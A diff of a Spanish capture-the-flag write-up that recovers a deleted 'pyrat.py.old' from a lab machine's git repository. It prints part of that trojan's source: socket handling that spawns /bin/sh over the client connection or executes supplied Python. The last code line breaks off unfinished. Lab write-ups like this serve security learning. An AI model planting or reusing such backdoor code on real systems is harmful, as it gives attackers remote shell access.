@@ -183,7 +183,72 @@ root         746  0.0  0.6 169444 12520 ?        Sl   19:12   0:00 python3 /root
 think       1900  0.0  0.0   6440   656 pts/0    S+   19:41   0:00 grep --color=auto -i rat
 ```
 
-podemos ver que el troyano ya se encuentra instalado, solo que dentro de root, asi que buscare en que puerto se esta ejecutando el programa para conectarnem con netcat 
+podemos ver que el troyano ya se encuentra instalado, aunque es el mismo por el que entre por primera vez, asi que luego de buscar entre direcotrios, voli al direcotrio .git dentro de think y encontre esto :
+
+```bash
+think@ip-10-66-149-120:/opt/dev/.git$ cat index
+DIRCd��C�d��I8T���������B\���� Wd�4▒��vi(
+                                         pyrat.py.oldTREE1 0
+V2z2e���EL5�    �&Y�9��q���P�������think@ip-10-66-149-120:/opt/dev/.git$ 
+
+```
+al parecer habia una version antigua de pyrat.py, intente ver los cambios del directorio pero no me dejaba, asi que me movi a la carpeta principal del repositorio :
+```bash
+think@ip-10-66-149-120:/opt/dev/.git$ git status
+fatal: this operation must be run in a work tree
+think@ip-10-66-149-120:/opt/dev/.git$ cd /opt/dev
+think@ip-10-66-149-120:/opt/dev$ ls
+think@ip-10-66-149-120:/opt/dev$ git status
+On branch master
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        deleted:    pyrat.py.old
+
+no changes added to commit (use "git add" and/or "git commit -a")
+think@ip-10-66-149-120:/opt/dev$ 
+
+```
+Restuare el archivo original
+
+```bash
+think@ip-10-66-149-120:/opt/dev$ git restore pyrat.py.old
+think@ip-10-66-149-120:/opt/dev$ ls
+pyrat.py.old
+think@ip-10-66-149-120:/opt/dev$ 
+
+```
+al leerlo con cat, contiene un script de python adentro
+```python
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+```
+
+
+
+
 
 
 
